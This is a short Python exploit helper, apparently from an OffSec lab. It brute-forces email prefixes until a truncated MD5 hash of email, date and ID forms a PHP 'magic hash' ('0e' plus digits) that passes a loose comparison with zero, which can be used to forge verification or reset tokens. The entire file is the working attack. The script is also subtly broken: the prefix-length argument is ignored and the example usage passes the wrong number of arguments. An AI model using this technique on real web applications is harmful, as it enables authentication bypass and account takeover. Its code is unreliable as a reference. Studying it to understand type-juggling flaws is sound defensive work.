import hashlib, string, itertools, re, sys

def gen_code(domain, id, date, prefix_length):
    count = 0

    for word in itertools.product(string.ascii_letters, repeat=3):
        joined = ""
        for char in word:
            joined += char

        mystring = ((joined + "@" + domain) + date + id).encode("utf-8")
        hash = hashlib.md5(mystring).hexdigest()[:10]    
        if re.match(r'0+[eE]\d+$', hash):
            print ("(+) Found a valid email! %s@%s" % (joined, domain))
            print ("(+) Requests made: %d" % count)
            print ("(+) Equivalent loose comparison: %s == 0\n" % (hash))
        count += 1

def main():
    if len(sys.argv) != 5:
        print ("(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>" % sys.argv[0])
        print ("(+) eg: %s offsec.local 3 2018-06-10 23:59:59 3" % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    creation_date = sys.argv[3]
    prefix_length = sys.argv[4]

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()
